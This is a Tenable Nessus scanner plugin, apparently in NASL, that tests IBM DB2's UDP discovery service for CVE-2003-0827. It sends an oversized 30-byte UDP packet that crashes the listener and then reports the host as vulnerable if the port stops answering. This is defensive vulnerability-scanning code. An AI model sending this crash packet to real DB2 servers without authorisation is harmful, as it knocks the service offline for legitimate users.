#
# (C) Tenable Network Security, Inc.
#
#
# References:
# Date: Thu, 18 Sep 2003 20:17:36 -0400
# From: "Aaron C. Newman" <aaron@NEWMAN-FAMILY.COM>
# Subject: AppSecInc Security Alert: Denial of Service Vulnerability in DB2 Discovery Service
# To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
#

include("compat.inc");

if (description)
{
 script_id(11896);
 script_version("$Revision: 1.24 $");
 script_cvs_date("$Date: 2015/08/03 14:14:44 $");

 script_cve_id("CVE-2003-0827");
 script_bugtraq_id(8653);
 script_osvdb_id(2169);

 script_name(english:"IBM DB2 Discovery Service Malformed UDP Packet Remote DoS");
 script_summary(english:"A large UDP packet kills the remote service.");

 script_set_attribute(attribute:"synopsis", value:
"The remote service is affected by a denial of service vulnerability.");
 script_set_attribute(attribute:"description", value:
"It was possible to crash the IBM DB2 UDP-based discovery listener on
the remote host by sending it a packet with more than 20 bytes. An
unauthenticated attacker can use this attack to make this service
crash continuously, thereby denying service to legitimate users.");
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/338234/30/0/threaded");
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8d0c33a1");
 script_set_attribute(attribute:"solution", value:"Apply IBM Fix Pack 10a or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2003/09/19");
 script_set_attribute(attribute:"plugin_publication_date", value:"2003/10/17");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:db2");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2003-2015 Tenable Network Security, Inc.");
 script_family(english:"Databases");

 script_dependencies("db2_discovery_detect.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_udp_ports("Services/udp/db2_ds");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("network_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_kb_item("Services/udp/db2_ds");
if (! port || ! get_udp_port_state(port)) exit(0, "DB2 DS is not running.");

# There is probably a clean way to do it and change this script to
# an ACT_GATHER_INFO or ACT_MIXED...

if (! test_udp_port(port: port)) exit(0);

s = open_sock_udp(port);
if (! s) exit(0);
send(socket: s, data: crap(30));
close(s);

if (! test_udp_port(port: port)) security_warning(port:port, proto:"udp");
